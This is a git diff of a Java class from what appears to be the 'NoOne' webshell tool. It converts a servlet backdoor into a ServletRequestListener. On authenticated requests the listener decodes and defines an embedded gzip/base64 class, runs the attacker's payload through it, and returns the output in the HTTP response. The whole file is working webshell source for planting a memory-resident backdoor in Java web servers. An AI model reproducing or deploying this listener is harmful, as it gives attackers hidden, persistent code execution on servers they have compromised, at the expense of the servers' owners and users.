@@ -1,55 +1,72 @@
 package com.reajason.noone.core.shelltool;
 
-import javax.servlet.*;
+import javax.servlet.ServletOutputStream;
+import javax.servlet.ServletRequestEvent;
+import javax.servlet.ServletRequestListener;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
+import java.io.*;
 import java.util.zip.GZIPInputStream;
 
 /**
  * @author ReaJason
  * @since 2025/8/29
  */
-public class NoOneServlet extends ClassLoader implements Servlet {
+public class NoOneStagelessListener extends ClassLoader implements ServletRequestListener {
 
-    private static Class<?> coreClass = null;
+    private static volatile Class<?> coreClass = null;
     private static String coreGzipBase64;
 
-    public NoOneServlet() {
+    public NoOneStagelessListener() {
     }
 
-    public NoOneServlet(ClassLoader parent) {
+    public NoOneStagelessListener(ClassLoader parent) {
         super(parent);
     }
 
+
     @Override
-    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
-        HttpServletRequest request = (HttpServletRequest) req;
-        HttpServletResponse response = (HttpServletResponse) res;
+    public void requestDestroyed(ServletRequestEvent sre) {
+
+    }
+
+    @Override
+    public void requestInitialized(ServletRequestEvent sre) {
+        HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
         try {
             if (isAuthed(request)) {
+                HttpServletResponse response = (HttpServletResponse) getResponseFromRequest(request);
+                ServletOutputStream responseOutputStream = response.getOutputStream();
                 try {
-                    byte[] payload = transformReqPayload(getArgFromRequest(request));
                     if (coreClass == null) {
-                        byte[] bytes = gzipDecompress(decodeBase64(coreGzipBase64));
-                        coreClass = new NoOneServlet(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
+                        synchronized (NoOneStagelessListener.class) {
+                            if (coreClass == null) {
+                                byte[] bytes = gzipDecompress(decodeBase64(coreGzipBase64));
+                                coreClass = new NoOneStagelessListener(Thread.currentThread().getContextClassLoader())
+                                        .defineClass(bytes, 0, bytes.length);
+                            }
+                        }
                     }
-                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+                    byte[] payload = transformReqPayload(getArgFromRequest(request));
                     Object httpChannelCore = coreClass.newInstance();
+                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+                    httpChannelCore.equals(new Object[]{request, response});
                     httpChannelCore.equals(new Object[]{payload, outputStream});
-                    ServletOutputStream responseOutputStream = response.getOutputStream();
                     byte[] data = wrapResData(transformResData(outputStream.toByteArray()));
                     responseOutputStream.write(data);
-                    wrapResponse(response);
-                    responseOutputStream.flush();
-                    responseOutputStream.close();
-                } catch (Throwable ignored) {
+                } catch (Exception e) {
+                    responseOutputStream.write(getStackTraceAsString(e).getBytes("UTF-8"));
                 }
+                wrapResponse(response);
+                responseOutputStream.flush();
+                responseOutputStream.close();
             }
         } catch (Throwable ignored) {
         }
+    }
+
+    private Object getResponseFromRequest(Object request) throws Exception {
+        return null;
     }
 
     private boolean isAuthed(Object request) {
@@ -108,23 +125,11 @@ public class NoOneServlet extends ClassLoader implements Servlet {
         }
     }
 
-    @Override
-    public void init(ServletConfig config) throws ServletException {
-
+    private String getStackTraceAsString(Throwable throwable) {
+        StringWriter sw = new StringWriter();
+        PrintWriter pw = new PrintWriter(sw);
+        throwable.printStackTrace(pw);
+        return sw.toString();
     }
 
-    @Override
-    public ServletConfig getServletConfig() {
-        return null;
-    }
-
-    @Override
-    public String getServletInfo() {
-        return "";
-    }
-
-    @Override
-    public void destroy() {
-
-    }
 }
